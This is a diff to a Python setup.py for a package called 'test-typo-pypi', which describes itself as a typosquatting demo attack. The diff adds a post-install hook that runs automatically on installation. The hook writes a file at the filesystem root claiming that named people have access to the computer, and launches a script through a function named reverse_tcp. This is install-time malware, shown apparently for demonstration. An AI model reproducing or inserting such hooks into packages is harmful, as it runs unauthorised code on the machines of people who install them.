@@ -1,7 +1,6 @@
 #!/usr/bin/env python
 from __future__ import print_function
 import os
-import atexit
 from setuptools import setup
 from setuptools.command.develop import develop
 from setuptools.command.install import install
@@ -17,21 +16,20 @@ with open(long_description_filename) as fd:
 
 
 def reverse_tcp():
-    _post_install()
     import subprocess, sys
     p = subprocess.Popen([sys.executable, 'script.py'],
                      stdout=subprocess.PIPE,
                      stderr=subprocess.STDOUT)
-def _post_install():
-    f= open("/0wned.txt","w+")
-    for i in range(10):
-        f.write("This is line %d\r\n" % (i+1))
+def write_file():
+    f= open("/typosquatting.txt","w+")
+    f.write("Joan, Amine and Souhail now have access to your computer")
     f.close()
 
 
 class PostInstallCommand(install):
     def run(self):
 	print("running hack")
+        write_file()
 	reverse_tcp()
         install.run(self)
 	
@@ -39,7 +37,7 @@ class PostInstallCommand(install):
 
 setup(
     name='test-typo-pypi',
-    version='1.1.18',
+    version='1.1.24',
     description='Typosquating demo attack.',
     long_description=long_description,
     long_description_content_type='text/markdown',
